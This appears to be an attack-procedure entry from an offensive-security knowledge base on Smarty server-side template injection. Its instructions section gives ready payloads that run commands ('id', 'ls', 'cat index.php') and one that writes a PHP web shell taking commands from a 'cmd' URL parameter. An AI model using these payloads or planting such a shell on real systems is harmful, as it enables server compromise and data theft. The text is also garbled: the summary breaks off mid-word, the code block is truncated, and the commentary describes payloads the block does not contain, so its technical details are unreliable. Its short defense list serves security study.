---
id: dfd3bbbf-ca7b-4bb4-93a1-6717f5bcb105
name: Command Execution and File Manipulation via Smarty Template Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:40.255189+00:00'
updated_at: '2023-04-10T20:23:29.929168+00:00'
tags:
- '[[Server Side Template Injection]]'
- '[[Smarty]]'
---

# Command Execution and File Manipulation via Smarty Template Injection

## Summary

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject code into a server-side template, which is then executed by the server. In this case, the vulnerability is present in the Smarty template engine. An attacker can exploit this vulnerability to execute arbitrar

## Description

# Description

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject code into a server-side template, which is then executed by the server. In this case, the vulnerability is present in the Smarty template engine. An attacker can exploit this vulnerability to execute arbitrary commands on the server or to manipulate files on the server. This can be used to steal sensitive data, modify or delete files, or to gain further access to the network.

Technical Explanation: Smarty is a popular template engine used in many PHP applications. It allows developers to separate the presentation layer from the business logic. However, if user input is not properly sanitized, it can lead to SSTI vulnerabilities. An attacker can inject code into a template variable, which is then executed by the server when the template is rendered. The code can be used to execute commands or to manipulate files on the server.

Business Value: An attacker can use this vulnerability to gain unauthorized access to sensitive data or to disrupt business operations. This can result in financial losses, damage to the company's reputation, and legal liabilities.

## Requirements

1. Access to the vulnerable application

1. Knowledge of the template engine and its vulnerabilities

## Defense

1. Always sanitize user input before using it in templates

1. Keep the template engine up to date with the latest security patches

1. Implement strict access controls to limit the impact of a successful attack

## Objectives

1. Execute arbitrary commands on the server

1. Manipulate files on the server

# Instructions

1. This command allows an attacker to execute arbitrary commands and manipulate files on the target system via a vulnerability in the Smarty template engine. The attacker can inject malicious code into the template file, which is then executed on the server when the file is processed. The commands and file manipulation techniques that can be used depend on the version of Smarty being used.

**Code**: [[{$smarty.version}
{php}echo `id`;{/php} //deprecat]]

> The `{$smarty.version}` variable displays the version of Smarty being used. The `{php}echo `id`;{/php}` command displays the user ID of the current user. The `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` command writes a PHP file to the server that allows the attacker to execute arbitrary commands via the `cmd` parameter in the URL. The `{system('ls')}` command lists the files in the current directory, and the `{system('cat index.php')}` command displays the contents of the `index.php` file.

## Tags

- [[Server Side Template Injection]]
- [[Smarty]]
